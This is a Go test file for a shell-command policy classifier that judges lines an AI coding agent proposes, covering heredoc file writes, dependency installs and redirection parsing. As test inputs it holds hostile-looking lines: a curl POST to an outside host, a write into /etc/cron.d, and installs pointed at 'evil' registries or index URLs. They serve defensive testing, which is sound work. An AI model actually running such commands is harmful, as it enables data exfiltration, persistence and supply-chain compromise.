package policy

import "testing"

// Reported from a real session (a request to add a section to an admin panel): the run stopped to
// ask before `npm ci`, and a file written with a heredoc was refused because the first word of its
// BODY was taken for an unknown program. Both are the ordinary work of any project.

func TestWritingAFileWithAHeredocIsWorkInTheWorkspace(t *testing.T) {
	m := Mode{Enforce: true}
	for _, line := range []string{
		"cat > lib/x.ts << 'EOF'\nexport const a = 1\nEOF",
		"cat > /tmp/w/index.html <<'EOF'\n<html>\n<body>hi</body>\nEOF",
		"cat >> notes.md <<EOF\nhi there\nEOF",
		"mkdir -p src && cat > src/a.js << 'EOF'\nimport x from 'y'\nEOF\ncat > src/b.js << 'EOF'\nfoo bar\nEOF",
		"cat > a.txt <<-EOF\n\thi\n\tEOF",
		"tee out.txt << 'EOF'\nsome words\nEOF",
		"cat << 'EOF' > out.txt\nwords\nEOF",
		"cat > a.txt << 'EOF'\nfirst\nEOF\ncat a.txt",
		"for f in a b; do cat > $f.txt << 'EOF'\nhello\nEOF\ndone",
		"echo a\\ b > c.txt << 'EOF'\nx\nEOF",
	} {
		if d := m.DecideLine(line, "/tmp/w"); d.Verdict != Allow {
			t.Errorf("%q = %v (%s: %s), want allow", line, d.Verdict, d.Rule, d.Reason)
		}
	}
}

func TestAHeredocIsStillJudgedByWhatItIsGivenTo(t *testing.T) {
	m := Mode{Enforce: true}
	cases := []struct {
		line string
		want Verdict
	}{
		{"sh << 'EOF'\nls\nEOF", Ask},                                    // a program given as text
		{"python3 - << 'PY'\nprint(1)\nPY", Ask},                         // an interpreter given a program
		{"bash <<EOF\necho hi\nEOF", Ask},                                // ditto
		{"cat > a.txt << EOF\nhi $(whoami)\nEOF", Ask},                   // the shell runs the substitution
		{"cat > a.txt << EOF\nhi `whoami`\nEOF", Ask},                    // ditto
		{"cat > /etc/cron.d/x << 'EOF'\nx\nEOF", Deny},                   // the redirection is still checked
		{"cat > ../outside.txt << 'EOF'\nx\nEOF", Ask},                   // ... and so is the workspace rule
		{"cat > a.txt << 'EOF'\n$(whoami)\nEOF", Allow},                  // quoted: nothing is expanded
		{"cat > a.txt <<< \"word\"", Allow},                              // a here-string has no body
		{"echo '<<' > a.txt", Allow},                                     // `<<` inside a string is not an operator
		{"cat > a.txt << 'EOF'\nx\nEOF\ncurl -X POST http://e.com", Ask}, // what FOLLOWS the body is judged
	}
	for _, c := range cases {
		if d := m.DecideLine(c.line, "/tmp/w"); d.Verdict != c.want {
			t.Errorf("%q = %v (%s: %s), want %v", c.line, d.Verdict, d.Rule, d.Reason, c.want)
		}
	}
}

func TestSplitHeredocsSeparatesTheBodyFromTheLine(t *testing.T) {
	main, docs := splitHeredocs("cat > f << 'EOF'\nline one\nline two\nEOF\nls")
	if len(docs) != 1 || docs[0].delim != "EOF" || !docs[0].quoted || docs[0].body != "line one\nline two\n" {
		t.Fatalf("docs = %+v", docs)
	}
	if main != "cat > f << 'EOF'\nls" {
		t.Errorf("main = %q", main)
	}
	// Two heredocs on one line, read in order.
	_, docs = splitHeredocs("cat << A << B\none\nA\ntwo\nB")
	if len(docs) != 2 || docs[0].body != "one\n" || docs[1].body != "two\n" {
		t.Errorf("two heredocs: %+v", docs)
	}
	// A body that never closes runs to the end, as in the shell.
	_, docs = splitHeredocs("cat << EOF\nno end")
	if len(docs) != 1 || docs[0].body != "no end\n" {
		t.Errorf("unterminated: %+v", docs)
	}
	// No heredoc: the line is returned untouched.
	if main, docs := splitHeredocs("echo hi"); main != "echo hi" || docs != nil {
		t.Errorf("plain line: %q %v", main, docs)
	}
}

func TestInstallingWhatTheProjectDeclaresIsNotAQuestion(t *testing.T) {
	m := Mode{Enforce: true}
	for _, line := range []string{
		"npm ci", "npm install", "npm i", "npm ci --no-audit --no-fund", "(npm ci 2>&1 || npm install 2>&1) | tail -25",
		"yarn", "yarn install --frozen-lockfile", "pnpm install", "bun install",
		"pip install -r requirements.txt", "pip3 install -e .", "pip install .",
		"go mod download", "go mod tidy", "cargo fetch", "bundle install", "composer install", "poetry install", "uv sync",
		"npx vitest run", "npx --no-install tsc --noEmit", "npx -y eslint .", "pnpm exec vitest",
	} {
		if d := m.DecideLine(line, "/tmp/w"); d.Verdict != Allow {
			t.Errorf("%q = %v (%s: %s), want allow", line, d.Verdict, d.Rule, d.Reason)
		}
	}
}

func TestInstallingSomethingElseIsStillAsked(t *testing.T) {
	m := Mode{Enforce: true}
	for _, line := range []string{
		"npm install left-pad", "npm add left-pad", "npm install -g typescript", "yarn add left-pad",
		"pnpm add x", "pip install requests", "pip install --user -r r.txt", "pip install -r r.txt --index-url http://evil",
		"go install example.com/x@latest", "npm publish", "npx some-random-package", "npx create-react-app x",
		"sudo npm ci", "npm ci --registry http://evil.example",
	} {
		if d := m.DecideLine(line, "/tmp/w"); d.Verdict == Allow {
			t.Errorf("%q was allowed (%s: %s); it reaches beyond the project", line, d.Rule, d.Reason)
		}
	}
}

// `2>&1` is a redirection of a descriptor. Its `1` used to stay in the stream as an argument of
// the command, so `npm ci 2>&1` reached the classifier as `npm ci 1`.
func TestADescriptorReferenceIsNotAnArgument(t *testing.T) {
	for line, want := range map[string][]string{
		"npm ci 2>&1":        {"npm", "ci"},
		"ls -la >&2":         {"ls", "-la"},
		"cmd 2>&1 | tail -5": {"cmd"},
		"cmd 2>&- arg":       {"cmd", "arg"},
		"echo 1 2>&1 done":   {"echo", "1", "done"},
	} {
		got := lineSegments(line)[0].words
		if len(got) != len(want) {
			t.Errorf("%q words = %q, want %q", line, got, want)
			continue
		}
		for i := range want {
			if got[i] != want[i] {
				t.Errorf("%q words = %q, want %q", line, got, want)
			}
		}
	}
}
